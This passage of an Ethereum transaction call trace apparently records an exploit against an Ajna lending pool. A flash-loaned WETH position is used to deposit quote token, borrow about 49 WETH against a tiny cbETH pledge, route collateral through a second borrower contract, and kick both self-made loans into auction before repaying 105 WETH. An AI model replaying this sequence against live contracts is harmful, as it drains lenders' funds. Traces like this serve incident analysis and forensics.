From: 0xbe9895146f7af43049ca1c1ae358b0541ea49704 → 0x31724ca0c982a31fbb5c57f4217ab585271fc9a5 (0x31724ca0c982a31fbb5c57f4217ab585271fc9a5)
Gas used: 10783; status: success

```json
{
  "to": "0x80ad419c4783a09252ad6a576ce059f51cc53d47",
  "amount": 4176143520730184416
}
```

Returns:
```json
{
  "0": true
}
```

**F082 | path 0.13.3.15.6.0.1 | STATICCALL | balanceOf(address)**

From: 0x177622e79acece98c39f6e12fa78ac7fc8a8bf62 → WETH (0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2)
Gas used: 2534; status: success

```json
{
  "account": "0x177622e79acece98c39f6e12fa78ac7fc8a8bf62"
}
```

Returns:
```json
{
  "0": 824091954396711059
}
```

**F083 | path 0.13.3.15.6.0.2 | CALL | 0xfa461e33**

From: 0x177622e79acece98c39f6e12fa78ac7fc8a8bf62 → 0xe592427a0aece92de3edee1f18e0157c05861564 (0xe592427a0aece92de3edee1f18e0157c05861564)
Gas used: 12327; status: success

**F084 | path 0.13.3.15.6.0.2.0 | CALL | transferFrom(address,address,uint256)**

From: 0xe592427a0aece92de3edee1f18e0157c05861564 → WETH (0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2)
Gas used: 8225; status: success

```json
{
  "from": "0x00c9027573295ce079aa3b33f2f5c28ed62c9a77",
  "to": "0x177622e79acece98c39f6e12fa78ac7fc8a8bf62",
  "amount": 4750000000000000000
}
```

Returns:
```json
{
  "0": true
}
```

**F085 | path 0.13.3.15.6.0.3 | STATICCALL | balanceOf(address)**

From: 0x177622e79acece98c39f6e12fa78ac7fc8a8bf62 → WETH (0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2)
Gas used: 534; status: success

```json
{
  "account": "0x177622e79acece98c39f6e12fa78ac7fc8a8bf62"
}
```

Returns:
```json
{
  "0": 5574091954396711059
}
```

**F086 | path 0.13.3.15.7 | CALL | exactOutputSingle((address,address,uint24,address,uint256,uint256,uint256,uint160))**

From: 0x00c9027573295ce079aa3b33f2f5c28ed62c9a77 → 0xe592427a0aece92de3edee1f18e0157c05861564 (0xe592427a0aece92de3edee1f18e0157c05861564)
Gas used: 113657; status: success

```json
{
  "0": [
    "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2",
    "0xbe9895146f7af43049ca1c1ae358b0541ea49704",
    500,
    "0x80ad419c4783a09252ad6a576ce059f51cc53d47",
    1787930615,
    32577400578267644184,
    37111769601304475119,
    0
  ]
}
```

**F087 | path 0.13.3.15.7.0 | CALL | swap(address,bool,int256,uint160,bytes)**

From: 0xe592427a0aece92de3edee1f18e0157c05861564 → 0x840deeef2f115cf50da625f7368c24af6fe74410 (0x840deeef2f115cf50da625f7368c24af6fe74410)
Gas used: 105974; status: success

```json
{
  "0": "0x80ad419c4783a09252ad6a576ce059f51cc53d47",
  "1": false,
  "2": -32577400578267644184,
  "3": 1461446703485210103287273052203988822378723970341,
  "4": "0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000c9027573295ce079aa3b33f2f5c28ed62c9a77000000000000000000000000000000000000000000000000000000000000002bbe9895146f7af43049ca1c1ae358b0541ea497040001f4c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000000000000000000000"
}
```

**F088 | path 0.13.3.15.7.0.0 | CALL | transfer(address,uint256)**

From: 0x840deeef2f115cf50da625f7368c24af6fe74410 → cbETH (0xbe9895146f7af43049ca1c1ae358b0541ea49704)
Gas used: 11483; status: success

```json
{
  "to": "0x80ad419c4783a09252ad6a576ce059f51cc53d47",
  "amount": 32577400578267644184
}
```

Returns:
```json
{
  "0": true
}
```

**F089 | path 0.13.3.15.7.0.0.0 | DELEGATECALL | transfer(address,uint256)**

From: 0xbe9895146f7af43049ca1c1ae358b0541ea49704 → 0x31724ca0c982a31fbb5c57f4217ab585271fc9a5 (0x31724ca0c982a31fbb5c57f4217ab585271fc9a5)
Gas used: 10783; status: success

```json
{
  "to": "0x80ad419c4783a09252ad6a576ce059f51cc53d47",
  "amount": 32577400578267644184
}
```

Returns:
```json
{
  "0": true
}
```

**F090 | path 0.13.3.15.7.0.1 | STATICCALL | balanceOf(address)**

From: 0x840deeef2f115cf50da625f7368c24af6fe74410 → WETH (0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2)
Gas used: 2534; status: success

```json
{
  "account": "0x840deeef2f115cf50da625f7368c24af6fe74410"
}
```

Returns:
```json
{
  "0": 119890883411546279579
}
```

**F091 | path 0.13.3.15.7.0.2 | CALL | 0xfa461e33**

From: 0x840deeef2f115cf50da625f7368c24af6fe74410 → 0xe592427a0aece92de3edee1f18e0157c05861564 (0xe592427a0aece92de3edee1f18e0157c05861564)
Gas used: 15403; status: success

**F092 | path 0.13.3.15.7.0.2.0 | CALL | transferFrom(address,address,uint256)**

From: 0xe592427a0aece92de3edee1f18e0157c05861564 → WETH (0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2)
Gas used: 6225; status: success

```json
{
  "from": "0x00c9027573295ce079aa3b33f2f5c28ed62c9a77",
  "to": "0x840deeef2f115cf50da625f7368c24af6fe74410",
  "amount": 37111769601304475119
}
```

Returns:
```json
{
  "0": true
}
```

**F093 | path 0.13.3.15.7.0.3 | STATICCALL | balanceOf(address)**

From: 0x840deeef2f115cf50da625f7368c24af6fe74410 → WETH (0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2)
Gas used: 534; status: success

```json
{
  "account": "0x840deeef2f115cf50da625f7368c24af6fe74410"
}
```

Returns:
```json
{
  "0": 157002653012850754698
}
```

**F094 | path 0.13.3.15.8 | STATICCALL | balanceOf(address)**

From: 0x00c9027573295ce079aa3b33f2f5c28ed62c9a77 → WETH (0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2)
Gas used: 534; status: success

```json
{
  "account": "0x00c9027573295ce079aa3b33f2f5c28ed62c9a77"
}
```

Returns:
```json
{
  "0": 0
}
```

**F095 | path 0.13.3.15.9 | STATICCALL | balanceOf(address)**

From: 0x00c9027573295ce079aa3b33f2f5c28ed62c9a77 → WETH (0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2)
Gas used: 534; status: success

```json
{
  "account": "0x00c9027573295ce079aa3b33f2f5c28ed62c9a77"
}
```

Returns:
```json
{
  "0": 0
}
```

**F096 | path 0.13.3.15.10 | STATICCALL | balanceOf(address)**

From: 0x00c9027573295ce079aa3b33f2f5c28ed62c9a77 → cbETH (0xbe9895146f7af43049ca1c1ae358b0541ea49704)
Gas used: 1226; status: success

```json
{
  "account": "0x00c9027573295ce079aa3b33f2f5c28ed62c9a77"
}
```

Returns:
```json
{
  "0": 0
}
```

**F097 | path 0.13.3.15.10.0 | DELEGATECALL | balanceOf(address)**

From: 0xbe9895146f7af43049ca1c1ae358b0541ea49704 → 0x31724ca0c982a31fbb5c57f4217ab585271fc9a5 (0x31724ca0c982a31fbb5c57f4217ab585271fc9a5)
Gas used: 529; status: success

```json
{
  "account": "0x00c9027573295ce079aa3b33f2f5c28ed62c9a77"
}
```

Returns:
```json
{
  "0": 0
}
```

**F098 | path 0.13.3.16 | CALL | addQuoteToken(uint256,uint256,uint256,bool)**

From: 0x80ad419c4783a09252ad6a576ce059f51cc53d47 → AjnaPool (0xad24fc773e125edb223c38a39657cb64bc7c178e)
Gas used: 405320; status: success

```json
{
  "amount_": 49343732556986936488,
  "index_": 2000,
  "expiry_": 1787930615,
  "revertIfBelowLup_": false
}
```

Returns:
```json
{
  "bucketLP_": 49343732556986936488
}
```

**F099 | path 0.13.3.16.0 | DELEGATECALL | addQuoteToken(uint256,uint256,uint256,bool)**

From: 0xad24fc773e125edb223c38a39657cb64bc7c178e → ERC20Pool implementation (0x05bb4f6362b02f17c1a3f2b047a8b23368269a21)
Gas used: 405093; status: success

```json
{
  "amount_": 49343732556986936488,
  "index_": 2000,
  "expiry_": 1787930615,
  "revertIfBelowLup_": false
}
```

Returns:
```json
{
  "bucketLP_": 49343732556986936488
}
```

**F100 | path 0.13.3.16.0.0 | DELEGATECALL | addQuoteToken(mapping(uint256 => Bucket) storage,DepositsState storage,PoolState,AddQuoteParams)**

From: 0xad24fc773e125edb223c38a39657cb64bc7c178e → LenderActions (0x39b8bdd2c2b3409f2d2abbcc0368691da09ecdd0)
Gas used: 321373; status: success

**F101 | path 0.13.3.16.0.1 | DELEGATECALL | updateInterestState(InterestState storage,EmaState storage,DepositsState storage,PoolState,uint256)**

From: 0xad24fc773e125edb223c38a39657cb64bc7c178e → PoolCommons (0x1f172f881eba06aa7a991651780527c173783cf6)
Gas used: 53507; status: success

**F102 | path 0.13.3.16.0.2 | CALL | transferFrom(address,address,uint256)**

From: 0xad24fc773e125edb223c38a39657cb64bc7c178e → WETH (0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2)
Gas used: 10225; status: success

```json
{
  "from": "0x80ad419c4783a09252ad6a576ce059f51cc53d47",
  "to": "0xad24fc773e125edb223c38a39657cb64bc7c178e",
  "amount": 49343732556986936488
}
```

Returns:
```json
{
  "0": true
}
```

**F103 | path 0.13.3.17 | CALL | drawDebt(address,uint256,uint256,uint256)**

From: 0x80ad419c4783a09252ad6a576ce059f51cc53d47 → AjnaPool (0xad24fc773e125edb223c38a39657cb64bc7c178e)
Gas used: 399804; status: success

```json
{
  "borrowerAddress_": "0x80ad419c4783a09252ad6a576ce059f51cc53d47",
  "amountToBorrow_": 49319073020475698638,
  "limitIndex_": 7388,
  "collateralToPledge_": 1054879496563856
}
```

**F104 | path 0.13.3.17.0 | DELEGATECALL | drawDebt(address,uint256,uint256,uint256)**

From: 0xad24fc773e125edb223c38a39657cb64bc7c178e → ERC20Pool implementation (0x05bb4f6362b02f17c1a3f2b047a8b23368269a21)
Gas used: 399580; status: success

```json
{
  "borrowerAddress_": "0x80ad419c4783a09252ad6a576ce059f51cc53d47",
  "amountToBorrow_": 49319073020475698638,
  "limitIndex_": 7388,
  "collateralToPledge_": 1054879496563856
}
```

**F105 | path 0.13.3.17.0.0 | STATICCALL | balanceOf(address)**

From: 0xad24fc773e125edb223c38a39657cb64bc7c178e → WETH (0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2)
Gas used: 534; status: success

```json
{
  "account": "0xad24fc773e125edb223c38a39657cb64bc7c178e"
}
```

Returns:
```json
{
  "0": 98687749893865032946
}
```

**F106 | path 0.13.3.17.0.1 | DELEGATECALL | drawDebt(AuctionsState storage,mapping(uint256 => Bucket) storage,DepositsState storage,LoansState storage,PoolState,uint256,address,uint256,uint256,uint256)**

From: 0xad24fc773e125edb223c38a39657cb64bc7c178e → BorrowerActions (0xde6c8171b5b971f71c405631f4e0568ed8491aac)
Gas used: 222274; status: success

**F107 | path 0.13.3.17.0.2 | DELEGATECALL | updateInterestState(InterestState storage,EmaState storage,DepositsState storage,PoolState,uint256)**

From: 0xad24fc773e125edb223c38a39657cb64bc7c178e → PoolCommons (0x1f172f881eba06aa7a991651780527c173783cf6)
Gas used: 89393; status: success

**F108 | path 0.13.3.17.0.3 | CALL | transferFrom(address,address,uint256)**

From: 0xad24fc773e125edb223c38a39657cb64bc7c178e → cbETH (0xbe9895146f7af43049ca1c1ae358b0541ea49704)
Gas used: 17493; status: success

```json
{
  "from": "0x80ad419c4783a09252ad6a576ce059f51cc53d47",
  "to": "0xad24fc773e125edb223c38a39657cb64bc7c178e",
  "amount": 1054879496563856
}
```

Returns:
```json
{
  "0": true
}
```

**F109 | path 0.13.3.17.0.3.0 | DELEGATECALL | transferFrom(address,address,uint256)**

From: 0xbe9895146f7af43049ca1c1ae358b0541ea49704 → 0x31724ca0c982a31fbb5c57f4217ab585271fc9a5 (0x31724ca0c982a31fbb5c57f4217ab585271fc9a5)
Gas used: 16819; status: success

```json
{
  "from": "0x80ad419c4783a09252ad6a576ce059f51cc53d47",
  "to": "0xad24fc773e125edb223c38a39657cb64bc7c178e",
  "amount": 1054879496563856
}
```

Returns:
```json
{
  "0": true
}
```

**F110 | path 0.13.3.17.0.4 | CALL | transfer(address,uint256)**

From: 0xad24fc773e125edb223c38a39657cb64bc7c178e → WETH (0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2)
Gas used: 3262; status: success

```json
{
  "to": "0x80ad419c4783a09252ad6a576ce059f51cc53d47",
  "amount": 49319073020475698638
}
```

Returns:
```json
{
  "0": true
}
```

**F111 | path 0.13.3.18 | CALL | transfer(address,uint256)**

From: 0x80ad419c4783a09252ad6a576ce059f51cc53d47 → cbETH (0xbe9895146f7af43049ca1c1ae358b0541ea49704)
Gas used: 28583; status: success

```json
{
  "to": "0x02d329ebb1da079a89988366b777af300db96f5f",
  "amount": 48128429404435444755
}
```

Returns:
```json
{
  "0": true
}
```

**F112 | path 0.13.3.18.0 | DELEGATECALL | transfer(address,uint256)**

From: 0xbe9895146f7af43049ca1c1ae358b0541ea49704 → 0x31724ca0c982a31fbb5c57f4217ab585271fc9a5 (0x31724ca0c982a31fbb5c57f4217ab585271fc9a5)
Gas used: 27883; status: success

```json
{
  "to": "0x02d329ebb1da079a89988366b777af300db96f5f",
  "amount": 48128429404435444755
}
```

Returns:
```json
{
  "0": true
}
```

**F113 | path 0.13.3.19 | CALL | 0x4082de67**

From: 0x80ad419c4783a09252ad6a576ce059f51cc53d47 → BorrowerB (0x02d329ebb1da079a89988366b777af300db96f5f)
Gas used: 331911; status: success

**F114 | path 0.13.3.19.0 | CALL | drawDebt(address,uint256,uint256,uint256)**

From: 0x02d329ebb1da079a89988366b777af300db96f5f → AjnaPool (0xad24fc773e125edb223c38a39657cb64bc7c178e)
Gas used: 327435; status: success

```json
{
  "borrowerAddress_": "0x02d329ebb1da079a89988366b777af300db96f5f",
  "amountToBorrow_": 49319073021475198888,
  "limitIndex_": 7388,
  "collateralToPledge_": 48128429404435444755
}
```

**F115 | path 0.13.3.19.0.0 | DELEGATECALL | drawDebt(address,uint256,uint256,uint256)**

From: 0xad24fc773e125edb223c38a39657cb64bc7c178e → ERC20Pool implementation (0x05bb4f6362b02f17c1a3f2b047a8b23368269a21)
Gas used: 327211; status: success

```json
{
  "borrowerAddress_": "0x02d329ebb1da079a89988366b777af300db96f5f",
  "amountToBorrow_": 49319073021475198888,
  "limitIndex_": 7388,
  "collateralToPledge_": 48128429404435444755
}
```

**F116 | path 0.13.3.19.0.0.0 | STATICCALL | balanceOf(address)**

From: 0xad24fc773e125edb223c38a39657cb64bc7c178e → WETH (0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2)
Gas used: 534; status: success

```json
{
  "account": "0xad24fc773e125edb223c38a39657cb64bc7c178e"
}
```

Returns:
```json
{
  "0": 49368676873389334308
}
```

**F117 | path 0.13.3.19.0.0.1 | DELEGATECALL | drawDebt(AuctionsState storage,mapping(uint256 => Bucket) storage,DepositsState storage,LoansState storage,PoolState,uint256,address,uint256,uint256,uint256)**

From: 0xad24fc773e125edb223c38a39657cb64bc7c178e → BorrowerActions (0xde6c8171b5b971f71c405631f4e0568ed8491aac)
Gas used: 211782; status: success

**F118 | path 0.13.3.19.0.0.2 | DELEGATECALL | updateInterestState(InterestState storage,EmaState storage,DepositsState storage,PoolState,uint256)**

From: 0xad24fc773e125edb223c38a39657cb64bc7c178e → PoolCommons (0x1f172f881eba06aa7a991651780527c173783cf6)
Gas used: 60898; status: success

**F119 | path 0.13.3.19.0.0.3 | CALL | transferFrom(address,address,uint256)**

From: 0xad24fc773e125edb223c38a39657cb64bc7c178e → cbETH (0xbe9895146f7af43049ca1c1ae358b0541ea49704)
Gas used: 10693; status: success

```json
{
  "from": "0x02d329ebb1da079a89988366b777af300db96f5f",
  "to": "0xad24fc773e125edb223c38a39657cb64bc7c178e",
  "amount": 48128429404435444755
}
```

Returns:
```json
{
  "0": true
}
```

**F120 | path 0.13.3.19.0.0.3.0 | DELEGATECALL | transferFrom(address,address,uint256)**

From: 0xbe9895146f7af43049ca1c1ae358b0541ea49704 → 0x31724ca0c982a31fbb5c57f4217ab585271fc9a5 (0x31724ca0c982a31fbb5c57f4217ab585271fc9a5)
Gas used: 10019; status: success

```json
{
  "from": "0x02d329ebb1da079a89988366b777af300db96f5f",
  "to": "0xad24fc773e125edb223c38a39657cb64bc7c178e",
  "amount": 48128429404435444755
}
```

Returns:
```json
{
  "0": true
}
```

**F121 | path 0.13.3.19.0.0.4 | CALL | transfer(address,uint256)**

From: 0xad24fc773e125edb223c38a39657cb64bc7c178e → WETH (0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2)
Gas used: 25162; status: success

```json
{
  "to": "0x02d329ebb1da079a89988366b777af300db96f5f",
  "amount": 49319073021475198888
}
```

Returns:
```json
{
  "0": true
}
```

**F122 | path 0.13.3.19.1 | CALL | transfer(address,uint256)**

From: 0x02d329ebb1da079a89988366b777af300db96f5f → WETH (0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2)
Gas used: 3262; status: success

```json
{
  "to": "0x80ad419c4783a09252ad6a576ce059f51cc53d47",
  "amount": 49319073021475198888
}
```

Returns:
```json
{
  "0": true
}
```

**F123 | path 0.13.3.20 | STATICCALL | borrowerInfo(address)**

From: 0x80ad419c4783a09252ad6a576ce059f51cc53d47 → AjnaPool (0xad24fc773e125edb223c38a39657cb64bc7c178e)
Gas used: 2007; status: success

```json
{
  "borrower_": "0x80ad419c4783a09252ad6a576ce059f51cc53d47"
}
```

Returns:
```json
{
  "0": 49343732556985936487,
  "1": 1054879496563856,
  "2": 46847420273778676282238
}
```

**F124 | path 0.13.3.20.0 | DELEGATECALL | borrowerInfo(address)**

From: 0xad24fc773e125edb223c38a39657cb64bc7c178e → ERC20Pool implementation (0x05bb4f6362b02f17c1a3f2b047a8b23368269a21)
Gas used: 1792; status: success

```json
{
  "borrower_": "0x80ad419c4783a09252ad6a576ce059f51cc53d47"
}
```

Returns:
```json
{
  "0": 49343732556985936487,
  "1": 1054879496563856,
  "2": 46847420273778676282238
}
```

**F125 | path 0.13.3.21 | STATICCALL | borrowerInfo(address)**

From: 0x80ad419c4783a09252ad6a576ce059f51cc53d47 → AjnaPool (0xad24fc773e125edb223c38a39657cb64bc7c178e)
Gas used: 2007; status: success

```json
{
  "borrower_": "0x02d329ebb1da079a89988366b777af300db96f5f"
}
```

Returns:
```json
{
  "0": 49343732557985936487,
  "1": 48128429404435444755,
  "2": 1026802322998020354
}
```

**F126 | path 0.13.3.21.0 | DELEGATECALL | borrowerInfo(address)**

From: 0xad24fc773e125edb223c38a39657cb64bc7c178e → ERC20Pool implementation (0x05bb4f6362b02f17c1a3f2b047a8b23368269a21)
Gas used: 1792; status: success

```json
{
  "borrower_": "0x02d329ebb1da079a89988366b777af300db96f5f"
}
```

Returns:
```json
{
  "0": 49343732557985936487,
  "1": 48128429404435444755,
  "2": 1026802322998020354
}
```

**F127 | path 0.13.3.22 | CALL | kick(address,uint256)**

From: 0x80ad419c4783a09252ad6a576ce059f51cc53d47 → AjnaPool (0xad24fc773e125edb223c38a39657cb64bc7c178e)
Gas used: 371931; status: success

```json
{
  "borrower_": "0x80ad419c4783a09252ad6a576ce059f51cc53d47",
  "npLimitIndex_": 7388
}
```

**F128 | path 0.13.3.22.0 | DELEGATECALL | kick(address,uint256)**

From: 0xad24fc773e125edb223c38a39657cb64bc7c178e → ERC20Pool implementation (0x05bb4f6362b02f17c1a3f2b047a8b23368269a21)
Gas used: 371719; status: success

```json
{
  "borrower_": "0x80ad419c4783a09252ad6a576ce059f51cc53d47",
  "npLimitIndex_": 7388
}
```

**F129 | path 0.13.3.22.0.0 | DELEGATECALL | kick(AuctionsState storage,DepositsState storage,LoansState storage,PoolState,address,uint256)**

From: 0xad24fc773e125edb223c38a39657cb64bc7c178e → KickerActions (0x33e5c2b41e915acfc268a4eaacc567f612f96601)
Gas used: 308838; status: success

**F130 | path 0.13.3.22.0.1 | DELEGATECALL | updateInterestState(InterestState storage,EmaState storage,DepositsState storage,PoolState,uint256)**

From: 0xad24fc773e125edb223c38a39657cb64bc7c178e → PoolCommons (0x1f172f881eba06aa7a991651780527c173783cf6)
Gas used: 26164; status: success

**F131 | path 0.13.3.22.0.2 | CALL | transferFrom(address,address,uint256)**

From: 0xad24fc773e125edb223c38a39657cb64bc7c178e → WETH (0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2)
Gas used: 3425; status: success

```json
{
  "from": "0x80ad419c4783a09252ad6a576ce059f51cc53d47",
  "to": "0xad24fc773e125edb223c38a39657cb64bc7c178e",
  "amount": 493437325569859365
}
```

Returns:
```json
{
  "0": true
}
```

**F132 | path 0.13.3.23 | CALL | kick(address,uint256)**

From: 0x80ad419c4783a09252ad6a576ce059f51cc53d47 → AjnaPool (0xad24fc773e125edb223c38a39657cb64bc7c178e)
Gas used: 196435; status: success

```json
{
  "borrower_": "0x02d329ebb1da079a89988366b777af300db96f5f",
  "npLimitIndex_": 7388
}
```

**F133 | path 0.13.3.23.0 | DELEGATECALL | kick(address,uint256)**

From: 0xad24fc773e125edb223c38a39657cb64bc7c178e → ERC20Pool implementation (0x05bb4f6362b02f17c1a3f2b047a8b23368269a21)
Gas used: 196223; status: success

```json
{
  "borrower_": "0x02d329ebb1da079a89988366b777af300db96f5f",
  "npLimitIndex_": 7388
}
```

**F134 | path 0.13.3.23.0.0 | DELEGATECALL | kick(AuctionsState storage,DepositsState storage,LoansState storage,PoolState,address,uint256)**

From: 0xad24fc773e125edb223c38a39657cb64bc7c178e → KickerActions (0x33e5c2b41e915acfc268a4eaacc567f612f96601)
Gas used: 177090; status: success

**F135 | path 0.13.3.23.0.1 | DELEGATECALL | updateInterestState(InterestState storage,EmaState storage,DepositsState storage,PoolState,uint256)**

From: 0xad24fc773e125edb223c38a39657cb64bc7c178e → PoolCommons (0x1f172f881eba06aa7a991651780527c173783cf6)
Gas used: 4816; status: success

**F136 | path 0.13.3.23.0.2 | CALL | transferFrom(address,address,uint256)**

From: 0xad24fc773e125edb223c38a39657cb64bc7c178e → WETH (0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2)
Gas used: 3425; status: success

```json
{
  "from": "0x80ad419c4783a09252ad6a576ce059f51cc53d47",
  "to": "0xad24fc773e125edb223c38a39657cb64bc7c178e",
  "amount": 493437325579859365
}
```

Returns:
```json
{
  "0": true
}
```

**F137 | path 0.13.3.24 | STATICCALL | auctionInfo(address)**

From: 0x80ad419c4783a09252ad6a576ce059f51cc53d47 → AjnaPool (0xad24fc773e125edb223c38a39657cb64bc7c178e)
Gas used: 3791; status: success

```json
{
  "borrower_": "0x80ad419c4783a09252ad6a576ce059f51cc53d47"
}
```

Returns:
```json
{
  "kicker_": "0x80ad419c4783a09252ad6a576ce059f51cc53d47",
  "bondFactor_": 10000000000000000,
  "bondSize_": 493437325569859365,
  "kickTime_": 1787930315,
  "kickMomp_": 1025251253128124958,
  "neutralPrice_": 46847420273778676282238,
  "head_": "0x80ad419c4783a09252ad6a576ce059f51cc53d47",
  "next_": "0x02d329ebb1da079a89988366b777af300db96f5f",
  "prev_": "0x0000000000000000000000000000000000000000",
  "alreadyTaken_": false
}
```

**F138 | path 0.13.3.24.0 | DELEGATECALL | auctionInfo(address)**

From: 0xad24fc773e125edb223c38a39657cb64bc7c178e → ERC20Pool implementation (0x05bb4f6362b02f17c1a3f2b047a8b23368269a21)
Gas used: 3543; status: success

```json
{
  "borrower_": "0x80ad419c4783a09252ad6a576ce059f51cc53d47"
}
```

Returns:
```json
{
  "kicker_": "0x80ad419c4783a09252ad6a576ce059f51cc53d47",
  "bondFactor_": 10000000000000000,
  "bondSize_": 493437325569859365,
  "kickTime_": 1787930315,
  "kickMomp_": 1025251253128124958,
  "neutralPrice_": 46847420273778676282238,
  "head_": "0x80ad419c4783a09252ad6a576ce059f51cc53d47",
  "next_": "0x02d329ebb1da079a89988366b777af300db96f5f",
  "prev_": "0x0000000000000000000000000000000000000000",
  "alreadyTaken_": false
}
```

**F139 | path 0.13.3.25 | STATICCALL | auctionInfo(address)**

From: 0x80ad419c4783a09252ad6a576ce059f51cc53d47 → AjnaPool (0xad24fc773e125edb223c38a39657cb64bc7c178e)
Gas used: 3791; status: success

```json
{
  "borrower_": "0x02d329ebb1da079a89988366b777af300db96f5f"
}
```

Returns:
```json
{
  "kicker_": "0x80ad419c4783a09252ad6a576ce059f51cc53d47",
  "bondFactor_": 10000000000000000,
  "bondSize_": 493437325579859365,
  "kickTime_": 1787930315,
  "kickMomp_": 1025251253128124958,
  "neutralPrice_": 1026802322998020354,
  "head_": "0x80ad419c4783a09252ad6a576ce059f51cc53d47",
  "next_": "0x0000000000000000000000000000000000000000",
  "prev_": "0x80ad419c4783a09252ad6a576ce059f51cc53d47",
  "alreadyTaken_": false
}
```

**F140 | path 0.13.3.25.0 | DELEGATECALL | auctionInfo(address)**

From: 0xad24fc773e125edb223c38a39657cb64bc7c178e → ERC20Pool implementation (0x05bb4f6362b02f17c1a3f2b047a8b23368269a21)
Gas used: 3543; status: success

```json
{
  "borrower_": "0x02d329ebb1da079a89988366b777af300db96f5f"
}
```

Returns:
```json
{
  "kicker_": "0x80ad419c4783a09252ad6a576ce059f51cc53d47",
  "bondFactor_": 10000000000000000,
  "bondSize_": 493437325579859365,
  "kickTime_": 1787930315,
  "kickMomp_": 1025251253128124958,
  "neutralPrice_": 1026802322998020354,
  "head_": "0x80ad419c4783a09252ad6a576ce059f51cc53d47",
  "next_": "0x0000000000000000000000000000000000000000",
  "prev_": "0x80ad419c4783a09252ad6a576ce059f51cc53d47",
  "alreadyTaken_": false
}
```

**F141 | path 0.13.3.26 | STATICCALL | totalAuctionsInPool()**

From: 0x80ad419c4783a09252ad6a576ce059f51cc53d47 → AjnaPool (0xad24fc773e125edb223c38a39657cb64bc7c178e)
Gas used: 1437; status: success

```json
{}
```

Returns:
```json
{
  "0": 2
}
```

**F142 | path 0.13.3.26.0 | DELEGATECALL | totalAuctionsInPool()**

From: 0xad24fc773e125edb223c38a39657cb64bc7c178e → ERC20Pool implementation (0x05bb4f6362b02f17c1a3f2b047a8b23368269a21)
Gas used: 1234; status: success

```json
{}
```

Returns:
```json
{
  "0": 2
}
```

**F143 | path 0.13.3.27 | CALL | transfer(address,uint256)**

From: 0x80ad419c4783a09252ad6a576ce059f51cc53d47 → WETH (0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2)
Gas used: 3262; status: success

```json
{
  "to": "0xba12222222228d8ba445958a75a0704d566bf2c8",
  "amount": 105000000000000000003
}
```

Returns:
```json
{
  "0": true
}
```

**F144 | path 0.13.4 | STATICCALL | balanceOf(address)**

From: 0xba12222222228d8ba445958a75a0704d566bf2c8 → WETH (0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2)
Gas used: 534; status: success

```json
{
  "account": "0xba12222222228d8ba445958a75a0704d566bf2c8"
}
```

Returns:
```json
{
  "0": 1174119467591794019779
}
```
